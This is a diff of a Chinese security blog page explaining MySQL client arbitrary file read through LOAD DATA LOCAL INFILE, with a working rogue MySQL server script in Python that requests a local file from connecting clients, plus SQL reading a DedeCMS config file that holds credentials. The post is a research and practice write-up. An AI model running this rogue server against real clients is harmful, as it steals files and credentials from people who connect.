@@ -20,17 +20,27 @@
     <meta name="author" content="Misaki">
     <meta name="keywords" content="">
     <title>MySQL客户端任意文件读取 ~ Misaki&#39;s Blog</title>
-    <link rel="stylesheet" href="/css/Material_Icons.css">
-    <!-- <link rel="stylesheet" href="/css/font-awesome.css"> -->
+    
+<link rel="stylesheet" href="/css/Material_Icons.css">
+
+    <!-- 
+<link rel="stylesheet" href="/css/font-awesome.css">
+ -->
     <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css">
-    <link rel="stylesheet" href="/css/main.css">
     
-        <link rel="stylesheet" href="/css/post.css">
+<link rel="stylesheet" href="/css/main.css">
+
+    
         
-            <link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+<link rel="stylesheet" href="/css/post.css">
+
+        
+            
+<link rel="stylesheet" href="/css/Prettify/tomorrow-night-eighties.min.css">
+
         
     
-</head>
+<meta name="generator" content="Hexo 5.2.0"></head>
 
 <body class=" sidebar-collapse">
 <nav class="navbar navbar-transparent navbar-color-on-scroll fixed-top navbar-expand-lg" color-on-scroll="100" id="sectionsNav">
@@ -113,7 +123,7 @@
         <div class="section">
           <div class="post_content">
               <p>最早遇到这个问题的时候，大概是刚开始做安全的时候，那时候还没意识到利用等实际价值。18年的时候记得有一个CTF题，利用的就是扫描MySQL端口来获取读文件flag。直到今天看到一位大佬的拓展文章，打算实际的去利用实践一下。</p>
-<p><a href="https://lorexxar.cn/2020/01/14/css-mysql-chain" target="_blank" rel="noopener">https://lorexxar.cn/2020/01/14/css-mysql-chain</a></p>
+<p><a target="_blank" rel="noopener" href="https://lorexxar.cn/2020/01/14/css-mysql-chain">https://lorexxar.cn/2020/01/14/css-mysql-chain</a></p>
 <h3 id="LOAD-DATA-INFILE"><a href="#LOAD-DATA-INFILE" class="headerlink" title="LOAD DATA INFILE"></a><strong>LOAD DATA INFILE</strong></h3><p>LOAD DATA INFILE，作用是可以把文件读入到数据库的某个表里，如果在远程连接状态下使用了LOCAL关键字，即LOAD DATE LOCAL INFILE,那么就会从客户端读取一个本地文件，存入服务器端的table里。</p>
 <p>如果执行<code>load data infile &quot;C:/Windows/win.ini&quot; into table test FIELDS TERMINATED BY &#39;\n&#39;;</code>提示</p>
 <p><img src="/images/2020/01/20/e5325b10-3b4b-11ea-a659-bb8fa402ccb9.png" alt="image20200119151353641.png"></p>
@@ -140,16 +150,16 @@
 <p><img src="/images/2020/01/20/140e3490-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119163953396.png"></p>
 <p><strong>意思是可以在任何语句中返回具有读取权限的文件</strong>。</p>
 <h3 id="受影响应用"><a href="#受影响应用" class="headerlink" title="受影响应用"></a>受影响应用</h3><p>server端使用如下脚本：</p>
-<pre><code>#coding=utf-8 
+<pre class="line-numbers language-none"><code class="language-none">#coding&#x3D;utf-8 
 import socket
 import logging
-logging.basicConfig(level=logging.DEBUG)
+logging.basicConfig(level&#x3D;logging.DEBUG)
 
-filename=&quot;C:\\Windows\\win.ini&quot;
-sv=socket.socket()
+filename&#x3D;&quot;C:\\Windows\\win.ini&quot;
+sv&#x3D;socket.socket()
 sv.bind((&quot;&quot;,3306))
 sv.listen(5)
-conn,address=sv.accept()
+conn,address&#x3D;sv.accept()
 logging.info(&#39;Conn from: %r&#39;, address)
 conn.sendall(&quot;\x4a\x00\x00\x00\x0a\x35\x2e\x35\x2e\x35\x33\x00\x17\x00\x00\x00\x6e\x7a\x3b\x54\x76\x73\x61\x6a\x00\xff\xf7\x21\x02\x00\x0f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x70\x76\x21\x3d\x50\x5c\x5a\x32\x2a\x7a\x49\x3f\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00&quot;)
 conn.recv(9999)
@@ -157,38 +167,42 @@ logging.info(&quot;auth okay&quot;)
 conn.sendall(&quot;\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00&quot;)
 conn.recv(9999)
 logging.info(&quot;want file...&quot;)
-wantfile=chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename
+wantfile&#x3D;chr(len(filename)+1)+&quot;\x00\x00\x01\xFB&quot;+filename
 conn.sendall(wantfile)
-content=conn.recv(9999)
+content&#x3D;conn.recv(9999)
 logging.info(content)
-conn.close()
-</code></pre><p>利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应</p>
+conn.close()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>利用Navicat Premium来连接，在配置中点击测试连接，就会有返回响应</p>
 <p><img src="/images/2020/01/20/195f4a10-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171211299.png"></p>
 <p>python2的MySQLdb</p>
 <p><img src="/images/2020/01/20/1d4bed90-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119171833747.png"></p>
 <p>不过在测试中发现python3的pymysql确不受影响</p>
 <p><img src="/images/2020/01/20/214ba3e0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200119172212466.png"></p>
 <h3 id="拓展利用"><a href="#拓展利用" class="headerlink" title="拓展利用"></a>拓展利用</h3><p>在原文中，讲述了几种针对CMS的利用，那么就看一种针对dedecms的简单利用方式。</p>
-<pre><code>load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\n&#39;;
-</code></pre><p><img src="/images/2020/01/20/26688a00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120135559523.png"></p>
-<pre><code>select * from dede_log;
-</code></pre><p>使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。</p>
+<pre class="line-numbers language-none"><code class="language-none">load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table dede_log FIELDS TERMINATED BY &#39;\n&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><img src="/images/2020/01/20/26688a00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120135559523.png"></p>
+<pre class="line-numbers language-none"><code class="language-none">select * from dede_log;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>使用dede默认的数据库的时候，连接信息被隐藏没有保存到数据。</p>
 <p><img src="/images/2020/01/20/2bc49c00-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140154255.png"></p>
 <p>先更改数据库</p>
-<pre><code>use test;
+<pre class="line-numbers language-none"><code class="language-none">use test;
 load data local infile &quot;D:\\phpstudy_pro\\WWW\\DedeCMS\\data\\common.inc.php&quot; into table test.test FIELDS TERMINATED BY &#39;\n&#39;;
-select * from test.test;
-</code></pre><p><img src="/images/2020/01/20/315aa9c0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140411574.png"></p>
+select * from test.test;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p><img src="/images/2020/01/20/315aa9c0-3b4c-11ea-a659-bb8fa402ccb9.png" alt="image20200120140411574.png"></p>
 
           </div>
           <br><br>
               
                 <div class="license-wrapper">
-                    <p>原文作者：<a href="">Misaki</a>
-                    <p>原文链接：<a href="/2020/01/MySQL客户端任意文件读取/">/2020/01/MySQL客户端任意文件读取/</a>
-                    <p>发表日期：<a href="/2020/01/MySQL客户端任意文件读取/">January 20th 2020, 2:15:08 pm</a>
-                    <p>更新日期：<a href="/2020/01/MySQL客户端任意文件读取/">January 20th 2020, 2:15:08 pm</a>
-                    <p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+                    <p>原文作者：<a href="https://misakikata.github.io">Misaki</a>
+                    <p>原文链接：<a href="https://misakikata.github.io/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">https://misakikata.github.io/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/</a>
+                    <p>发表日期：<a href="https://misakikata.github.io/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">January 20th 2020, 2:15:08 pm</a>
+                    <p>更新日期：<a href="https://misakikata.github.io/2020/01/MySQL%E5%AE%A2%E6%88%B7%E7%AB%AF%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/">January 20th 2020, 2:15:08 pm</a>
+                    <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
                 </div>
               
           <br><br>
@@ -226,7 +240,7 @@ select * from test.test;
     <script>               
         var disqus_shortname = '';
         var disqus_config = function () {
-            this.page.url = '/2020/01/MySQL客户端任意文件读取/'; 
+            this.page.url = 'https://misakikata.github.io/2020/01/MySQL客户端任意文件读取/'; 
             this.page.identifier = '/2020/01/MySQL客户端任意文件读取/';
         };
         (function() { 
@@ -237,7 +251,7 @@ select * from test.test;
             (d.head || d.body).appendChild(s);
         })();
     </script>
-    <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
+    <noscript>Please enable JavaScript to view the <a target="_blank" rel="noopener" href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>                                
 </div>
         
     
@@ -257,16 +271,32 @@ select * from test.test;
         </div>
 </footer>
       <!--   Core JS Files   -->
-      <script src="/js/core/jquery.min.js?v=3.2.1"></script>
-      <script src="/js/main.js"></script>
-      <script src="/js/core/popper.min.js"></script>
-      <script src="/js/core/bootstrap-material-design.min.js"></script>
-      <script src="/js/plugins/moment.min.js"></script>
-      <script src="/js/material-kit.min.js?v=2.0.5"></script>
+      
+<script src="/js/core/jquery.min.js?v=3.2.1.js"></script>
+
+      
+<script src="/js/main.js"></script>
+
+      
+<script src="/js/core/popper.min.js"></script>
+
+      
+<script src="/js/core/bootstrap-material-design.min.js"></script>
+
+      
+<script src="/js/plugins/moment.min.js"></script>
+
+      
+<script src="/js/material-kit.min.js?v=2.0.5.js"></script>
+
       
         <script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
-        <script src="/js/post.js"></script>
-        <script src="/js/plugins/prettify.js"></script>
+        
+<script src="/js/post.js"></script>
+
+        
+<script src="/js/plugins/prettify.js"></script>
+
         <script>
             $(document).ready(function(){
                 $('pre').addClass('prettyprint linenums');
